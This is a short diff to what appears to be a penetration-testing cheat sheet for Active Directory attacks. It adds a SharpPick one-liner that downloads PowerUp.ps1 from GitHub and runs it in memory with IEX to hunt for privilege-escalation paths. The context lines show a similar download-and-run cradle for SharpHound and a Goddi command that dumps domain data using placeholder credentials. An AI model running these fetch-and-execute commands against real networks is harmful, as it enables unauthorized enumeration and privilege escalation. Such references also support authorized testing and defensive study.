@@ -200,6 +200,8 @@ Use this when you cannot copy BloodHound.ps1 over to target.
 
 SharpPick.exe -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound"
 
+`SharpPick-64.exe -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks"`
+
 ### Goddi (fast dump all domain info)
 
 `.\godditest-windows-amd64.exe -username=testuser -password="testpass!" -domain="test.local" -dc="dc.test.local" -unsafe`
